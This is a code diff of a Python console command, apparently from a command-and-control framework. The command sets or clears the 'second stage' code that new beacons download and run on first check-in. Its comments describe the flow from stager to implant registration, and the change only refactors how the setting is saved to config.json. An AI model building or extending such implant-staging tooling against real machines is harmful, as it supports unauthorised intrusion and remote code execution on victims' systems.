@@ -5,46 +5,34 @@ stage -clear       清除第二段(恢复单段部署)
 
 配合: s_exec agent_stager 生成第一段(引导)部署命令——目标机执行引导 →
 连 server 注册 → 收到本第二段(init 任务) → exec → 完整植入物以同 id 注册。
+
+落盘走 core/config.update_config_file(进程内锁 + 原子替换),与 build/keygen/
+console/server 的 config.json 写共用一把锁(2026-09-28 修复并发丢键)。
 """
 
-import json
-import os
-
-
-def _atomic_dump(cfg_path: str, raw: dict) -> None:
-    """原子写 config.json(2026-09-04 B15): 临时文件 + os.replace,
-    避免与并发写(web 通道配置/二阶段保存/build)撞出半截 JSON。"""
-    tmp = cfg_path + ".tmp"
-    with open(tmp, "w", encoding="utf-8") as f:
-        json.dump(raw, f, indent=2, ensure_ascii=False)
-    os.replace(tmp, cfg_path)
+from server.core.config import update_config_file
 
 
 def run(disp, args):
+    cfg_path = getattr(disp.config, "config_path", "") or ""
     if not args:
         cur = getattr(disp.config, "stage_code", "") or ""
         if cur:
             return f"[*] 当前第二段已设定 ({len(cur)} 字节):\n{cur[:200]}{'...' if len(cur) > 200 else ''}"
         return "[!] usage: stage <代码...> | stage -clear"
     if args[0] == "-clear":
-        cfg_path = getattr(disp.config, "config_path", "") or ""
         disp.config.stage_code = ""
-        if cfg_path and os.path.isfile(cfg_path):
+        if cfg_path:
             try:
-                raw = json.load(open(cfg_path, encoding="utf-8"))
-                raw["stage_code"] = ""
-                _atomic_dump(cfg_path, raw)
+                update_config_file(cfg_path, stage_code="")
             except OSError:
                 pass
         return "[+] 第二段已清除(恢复单段部署)"
     code = " ".join(args)
     disp.config.stage_code = code
-    cfg_path = getattr(disp.config, "config_path", "") or ""
-    if cfg_path and os.path.isfile(cfg_path):
+    if cfg_path:
         try:
-            raw = json.load(open(cfg_path, encoding="utf-8"))
-            raw["stage_code"] = code
-            _atomic_dump(cfg_path, raw)
+            update_config_file(cfg_path, stage_code=code)
         except OSError:
             pass
     return f"[+] 第二段已设定 ({len(code)} 字节), 新 beacon 首次上线下发"
